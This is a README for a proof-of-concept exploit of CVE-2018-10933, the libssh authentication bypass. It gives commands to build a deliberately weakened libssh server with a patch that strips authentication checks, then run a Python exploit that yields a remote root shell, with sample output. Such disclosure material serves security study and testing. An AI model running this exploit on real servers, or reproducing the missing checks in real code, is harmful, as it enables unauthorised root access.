# CVE-2018-10933 - libssh Server-side Auth. Bypass
This is a simple Proof of Concept (PoC) to demonstrate successful
exploitation of the authentication-bypass vulnerability as found in
the server-side code of libssh 0.6 and later. See [Security Advisory for CVE-2018-10933](https://www.libssh.org/security/advisories/CVE-2018-10933.txt)
for more information.

## Vulnerable Server POC
In order to spawn and control a shell, the server code must somehow allow
several SSH requests such as `shell channel request`. Most implementations found
in the wild disallow them by checking the internal session's authentication
state. If the programmer insufficiently checked the authentication states, the
exploitation may be successful.

The [CVE-2018-10933-server.patch](CVE-2018-10933-server.patch) patch removes
checks for the authentication states in the `ssh_server_fork.c` example shipped
with libssh-0.7.4. See below for the patching instructions.

### Building the vulnerable server
```
$ wget https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz
$ tar -xvf libssh-0.7.4.tar.xz
$ cd libssh-0.7.4/
$ cd examples/
$ patch -p0 < CVE-2018-10933-server.patch
$ cd ..
$ mkdir -p build
$ cmake ..
$ make
```

### Running the vulnerable server
Here we're running the vulnerable SSH server to listen on localhost on port
tcp/2222:
```
$ cd examples/
$ sudo ./ssh_server_fork -p 2222 127.0.0.1
```

## Exploit
This repository includes a simple [exploit](CVE-2018-10933-SHELL-POC.py) code
written in Python that allow you to pass commands directly to the shell of a
vulnerable libssh server (see above for a vulnerable server implementation).

#### Prerequisites
 * Python 2.7 or 3.4+
 * [Paramiko](http://www.paramiko.org/)

### Features
 * Remote shell (non-interactive)
 * TCP Port Forwarding (experimental)

#### Usage
```
$ git clone https://github.com/e3prom/miscsec.git
$ cd miscsec/CVE-2018-10933
$ python CVE-2018-10933-SHELL-POC.py --verbose -p 2222 127.0.0.1
[*] Type 'quit' to exit this command prompt.

$ id
uid=0(root) gid=0(root) groups=0(root),999(docker)
$ quit
```

## Disclaimer
As always, please check your local laws and regulation regarding the use of
this software. Do not use this exploit on a server without the owner's
consent and authorization.

## Credits
* The vulnerability has been discovered by Peter Winter-Smith of NCC Group.
* [CVE-2018-10933: libssh: authentication bypass in server code](https://seclists.org/oss-sec/2018/q4/55)
* [SoledaD208's CVE-2018-10933 very simple POC](https://github.com/SoledaD208/CVE-2018-10933)
